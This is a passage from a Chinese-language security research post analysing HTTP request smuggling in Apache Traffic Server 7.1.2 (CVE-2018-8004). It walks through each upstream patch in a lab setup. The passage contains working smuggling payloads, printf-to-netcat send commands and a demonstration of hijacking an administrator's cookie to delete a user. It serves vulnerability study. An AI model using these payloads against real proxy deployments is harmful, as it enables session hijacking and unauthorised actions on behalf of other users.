56</code>这个中间存在空格的请求头，它认为这个请求头是有效的。这样一来，后续的数据也被当做这个请求的一部分。总的来看，对于ATS服务器，这个请求就是完整的一个请求。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length : 56<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>attack: 1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>foo: <br></code></pre></td></tr></table></figure><p>ATS收到这个请求之后，根据Host字段的值，将这个请求包转发给对应的后端服务器。在这里是转发到了Nginx服务器上。</p><p>而Nginx服务器在遇到类似于这种<code>Content-Length : 56</code>的请求头时，会认为其是无效的，然后将其忽略掉。但并不会返回400错误，对于Nginx来说，收到的请求为</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>attack: 1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>foo: <br></code></pre></td></tr></table></figure><p>因为最后的末尾没有<code>\r\n</code>，这就相当于收到了一个完整的GET请求和一个不完整的GET请求。</p><p>完整的：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>不完整的：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>attack: 1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>foo: <br></code></pre></td></tr></table></figure><p>在这时，Nginx就会将第一个请求包对应的响应发送给ATS服务器，然后等待后续的第二个请求传输完毕再进行响应。</p><p>当ATS转发的下一个请求到达时，对于Nginx来说，就直接拼接到了刚刚收到的那个不完整的请求包的后面。也就相当于</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>\r\n<br><span class="hljs-attribute">Host</span>: lnmp.mengsec.com\r\n<br><span class="hljs-attribute">attack</span>: <span class="hljs-number">1</span>\r\n<br><span class="hljs-attribute">foo</span>: GET / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>\r\n<br><span class="hljs-attribute">Host</span>: <span class="hljs-number">10.211.55.2:10086</span>\r\n<br><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">10.211.55.2</span>\r\n<br><span class="hljs-attribute">Via</span>: http/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> mengchen-ubuntu[<span class="hljs-number">3</span>ff<span class="hljs-number">3687</span>d-fa<span class="hljs-number">2</span>a-<span class="hljs-number">4198</span>-bc<span class="hljs-number">9</span>a-<span class="hljs-number">0</span>e<span class="hljs-number">98786</span>adc<span class="hljs-number">62</span>] (ApacheTrafficServer/<span class="hljs-number">7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>)\r\n<br></code></pre></td></tr></table></figure><p>然后Nginx将这个请求包的响应发送给ATS服务器，我们收到的响应中就存在了<code>attack: 1</code>和<code>foo: GET / HTTP/1.1</code>这两个键值对了。</p><p>那这会造成什么危害呢？可以想一下，如果ATS转发的第二个请求不是我们发送的呢？让我们试一下。</p><p>假设在Nginx服务器下存在一个<code>admin.php</code>，代码内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] == <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are Admin\n&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;del&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;del user &#x27;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;del&#x27;</span>];<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not Admin&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于HTTP协议本身是无状态的，很多网站都是使用Cookie来判断用户的身份信息。通过这个漏洞，我们可以盗用管理员的身份信息。在这个例子中，管理员的请求中会携带这个一个<code>Cookie</code>的键值对<code>admin=1</code>，当拥有管理员身份时，就能通过GET方式传入要删除的用户名称，然后删除对应的用户。</p><p>在前面我们也知道了，通过构造特殊的请求包，可以使Nginx服务器把收到的某个请求作为上一个请求的一部分。这样一来，我们就能盗用管理员的Cookie了。</p><p>构造数据包</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length : 78<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>GET /admin.php?del=mengchen HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>attack: 1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>foo: <br></code></pre></td></tr></table></figure><p>然后是管理员的正常请求</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>lnmp.mengsec.com<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>admin=1<br></code></pre></td></tr></table></figure><p>让我们看一下效果如何。</p><p><img src="https://image.mengsec.com/request-smugging/image-20191008123056679.png" alt="image-20191008123056679"></p><p>在Wireshark的数据包中看的很直观，阴影部分为管理员发送的正常请求。</p><p><img src="https://image.mengsec.com/request-smugging/image-20191008123343584.png" alt="image-20191008123343584"></p><p>在Nginx服务器上拼接到了上一个请求中， 成功删除了用户mengchen。</p><h4 id="4-3-2-第二个补丁"><a href="#4-3-2-第二个补丁" class="headerlink" title="4.3.2 第二个补丁"></a>4.3.2 第二个补丁</h4><blockquote><p><a href="https://github.com/apache/trafficserver/pull/3201">https://github.com/apache/trafficserver/pull/3201</a> # 3201 当返回400错误时，关闭连接</p></blockquote><p>这个补丁说明了，在ATS 7.1.2中，如果请求导致了400错误，建立的TCP链接也不会关闭。在regilero的对CVE-2018-8004的分析<a href="https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/">文章</a>中，说明了如何利用这个漏洞进行攻击。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">printf &#x27;GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>&#x27;Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>&#x27;aa: <span class="hljs-symbol">\0</span>bb<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>&#x27;foo: bar<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>&#x27;GET /2333 HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>&#x27;Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>&#x27;<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>| nc 10.211.55.22 80<br></code></pre></td></tr></table></figure><p>一共能够获得2个响应，都是400错误。</p><p><img src="https://image.mengsec.com/request-smugging/image-20191009161111039.png" alt="image-20191009161111039"></p><p>ATS在解析HTTP请求时，如果遇到<code>NULL</code>，会导致一个截断操作，我们发送的这一个请求，对于ATS服务器来说，算是两个请求。</p><p>第一个</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>aa: <br></code></pre></td></tr></table></figure><p>第二个</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">bb<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>foo: bar<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>GET /2333 HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>第一个请求在解析的时候遇到了<code>NULL</code>，ATS服务器响应了第一个400错误，后面的<code>bb\r\n</code>成了后面请求的开头，不符合HTTP请求的规范，这就响应了第二个400错误。</p><p>再进行修改下进行测试</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">printf &#x27;GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>&#x27;Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>&#x27;aa: <span class="hljs-symbol">\0</span>bb<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>&#x27;GET /1.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>&#x27;Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>&#x27;<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>| nc 10.211.55.22 80<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/request-smugging/image-20191009161651556.png" alt="image-20191009161651556"></p><p>一个400响应，一个200响应，在Wireshark中也能看到，ATS把第二个请求转发给了后端Apache服务器。</p><p><img src="https://image.mengsec.com/request-smugging/image-20191009161916024.png" alt="image-20191009161916024"></p><p>那么由此就已经算是一个HTTP请求拆分攻击了，</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>aa: <span class="hljs-symbol">\0</span>bb<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>GET /1.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>但是这个请求包，怎么看都是两个请求，中间的<code>GET /1.html HTTP/1.1\r\n</code>不符合HTTP数据包中请求头<code>Name:Value</code>的格式。在这里我们可以使用<code>absoluteURI</code>，在<code>RFC2616</code>中第<code>5.1.2</code>节中规定了它的详细格式。</p><blockquote><p><a href="https://tools.ietf.org/html/rfc2616#section-5.1.2">https://tools.ietf.org/html/rfc2616#section-5.1.2</a></p></blockquote><p>我们可以使用类似<code>GET http://www.w3.org/pub/WWW/TheProject.html HTTP/1.1</code>的请求头进行请求。</p><p>构造数据包</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET /400 HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>aa: <span class="hljs-symbol">\0</span>bb<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>GET http://ats.mengsec.com/1.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>GET /404 HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">printf &#x27;GET /400 HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>&#x27;Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>&#x27;aa: <span class="hljs-symbol">\0</span>bb<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>&#x27;GET http://ats.mengsec.com/1.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>&#x27;<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>&#x27;GET /404 HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>&#x27;Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>&#x27;<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;\<br>| nc 10.211.55.22 80<br></code></pre></td></tr></table></figure><p>本质上来说，这是两个HTTP请求，第一个为</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET /400 HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>aa: <span class="hljs-symbol">\0</span>bb<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>GET http://ats.mengsec.com/1.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>其中<code>GET http://ats.mengsec.com/1.html HTTP/1.1</code>为名为<code>GET http</code>，值为<code>//ats.mengsec.com/1.html HTTP/1.1</code>的请求头。</p><p>第二个为</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET /404 HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: ats.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>当该请求发送给ATS服务器之后，我们可以获取到三个HTTP响应，第一个为400，第二个为200，第三个为404。多出来的那个响应就是ATS中间对服务器1.html的请求的响应。</p><p><img src="https://image.mengsec.com/request-smugging/image-20191009170232529.png" alt="image-20191009170232529"></p><p>根据HTTP Pipepline的先入先出规则，假设攻击者向ATS服务器发送了第一个恶意请求，然后受害者向ATS服务器发送了一个正常的请求，受害者获取到的响应，就会是攻击者发送的恶意请求中的<code>GET http://evil.mengsec.com/evil.html HTTP/1.1</code>中的内容。这种攻击方式理论上是可以成功的，但是利用条件还是太苛刻了。</p><p>对于该漏洞的修复方式，ATS服务器选择了，当遇到400错误时，关闭TCP链接，这样无论后续有什么请求，都不会对其他用户造成影响了。</p><h4 id="4-3-3-第三个补丁"><a href="#4-3-3-第三个补丁" class="headerlink" title="4.3.3 第三个补丁"></a>4.3.3 第三个补丁</h4><blockquote><p><a href="https://github.com/apache/trafficserver/pull/3231">https://github.com/apache/trafficserver/pull/3231</a> # 3231 验证请求中的Content-Length头</p></blockquote><p>在该补丁中，bryancall 的描述是</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">当Content-<span class="hljs-built_in">Length</span>请求头不匹配时，响应<span class="hljs-number">400</span>，删除具有相同Content-<span class="hljs-built_in">Length</span>请求头的重复副本，如果存在Transfer-Encoding请求头，则删除Content-<span class="hljs-built_in">Length</span>请求头。<br></code></pre></td></tr></table></figure><p>从这里我们可以知道，ATS 7.1.2版本中，并没有对<code>RFC2616</code>的标准进行完全实现，我们或许可以进行<code>CL-TE</code>走私攻击。</p><p>构造请求</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 6<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>G<br></code></pre></td></tr></table></figure><p>多次发送后就能获得<code>405 Not Allowed</code>响应。</p><p><img src="https://image.mengsec.com/request-smugging/image-20191009173844024.png" alt="image-20191009173844024"></p><p>我们可以认为，后续的多个请求在Nginx服务器上被组合成了类似如下所示的请求。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GGET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>......<br></code></pre></td></tr></table></figure><p>对于Nginx来说，<code>GGET</code>这种请求方法是不存在的，当然会返回<code>405</code>报错了。</p><p>接下来尝试攻击下<code>admin.php</code>，构造请求</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 83<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>GET /admin.php?del=mengchen HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>attack: 1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>foo: <br></code></pre></td></tr></table></figure><p>多次请求后获得了响应<code>You are not Admin</code>，说明服务器对<code>admin.php</code>进行了请求。</p><p><img src="https://image.mengsec.com/request-smugging/image-20191009175211574.png" alt="image-20191009175211574"></p><p>如果此时管理员已经登录了，然后想要访问一下网站的主页。他的请求为</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>lnmp.mengsec.com<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>admin=1<br></code></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://image.mengsec.com/request-smugging/image-20191009175454128.png" alt="image-20191009175454128"></p><p>我们可以看一下Wireshark的流量，其实还是很好理解的。</p><p><img src="https://image.mengsec.com/request-smugging/image-20191009180032415.png" alt="image-20191009180032415"></p><p>阴影所示部分就是管理员发送的请求，在Nginx服务器中组合进入了上一个请求中，就相当于</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /admin.php?del=mengchen HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: lnmp.mengsec.com<br><span class="hljs-attribute">attack</span>: <span class="hljs-number">1</span><br><span class="hljs-attribute">foo</span>: GET / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">10.211.55.2:10086</span><br><span class="hljs-attribute">Cookie</span>: admin=<span class="hljs-number">1</span><br><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">10.211.55.2</span><br><span class="hljs-attribute">Via</span>: http/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> mengchen-ubuntu[e<span class="hljs-number">9365059</span>-ad<span class="hljs-number">97</span>-<span class="hljs-number">40</span>c<span class="hljs-number">8</span>-afcb-d<span class="hljs-number">857</span>b<span class="hljs-number">14675</span>f<span class="hljs-number">6</span>] (ApacheTrafficServer/<span class="hljs-number">7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>携带着管理员的Cookie进行了删除用户的操作。这个与前面4.3.1中的利用方式在某种意义上其实是相同的。</p><h4 id="4-3-4-第四个补丁"><a href="#4-3-4-第四个补丁" class="headerlink" title="4.3.4 第四个补丁"></a>4.3.4 第四个补丁</h4><blockquote><p><a href="https://github.com/apache/trafficserver/pull/3251">https://github.com/apache/trafficserver/pull/3251</a> # 3251 当缓存命中时，清空请求体</p></blockquote><p>当时看这个补丁时，感觉是一脸懵逼，只知道应该和缓存有关，但一直想不到哪里会出问题。看代码也没找到，在9月17号的时候regilero的分析文章出来才知道问题在哪。</p><p>当缓存命中之后，ATS服务器会忽略请求中的<code>Content-Length</code>请求头，此时请求体中的数据会被ATS当做另外的HTTP请求来处理，这就导致了一个非常容易利用的请求走私漏洞。</p><p>在进行测试之前，把测试环境中ATS服务器的缓存功能打开，对默认配置进行一下修改，方便我们进行测试。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/opt/</span>ts-<span class="hljs-number">712</span><span class="hljs-regexp">/etc/</span>trafficserver/records.config<br><br>CONFIG proxy.config.http.cache.http INT <span class="hljs-number">1</span> <span class="hljs-comment"># 开启缓存功能</span><br>CONFIG proxy.config.http.cache.ignore_client_cc_max_age INT <span class="hljs-number">0</span> <span class="hljs-comment"># 使客户端Cache-Control头生效，方便控制缓存过期时间</span><br>CONFIG proxy.config.http.cache.required_headers INT <span class="hljs-number">1</span> <span class="hljs-comment"># 当收到Cache-control: max-age 请求头时，就对响应进行缓存</span><br></code></pre></td></tr></table></figure><p>然后重启服务器即可生效。</p><p>为了方便测试，我在Nginx网站目录下写了一个生成随机字符串的脚本<code>random_str.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">randomkeys</span>(<span class="hljs-params"><span class="hljs-variable">$length</span></span>)</span>&#123; <br>    <span class="hljs-variable">$output</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$a</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$a</span>&lt;<span class="hljs-variable">$length</span>; <span class="hljs-variable">$a</span>++) &#123;<br>        <span class="hljs-variable">$output</span> .= chr(mt_rand(<span class="hljs-number">33</span>, <span class="hljs-number">126</span>));<br>    &#125;   <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;get random string: &quot;</span>;<br><span class="hljs-keyword">echo</span> randomkeys(<span class="hljs-number">8</span>);<br></code></pre></td></tr></table></figure><p>构造请求包</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET /1.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Cache-control: max-age=10<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 56<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span 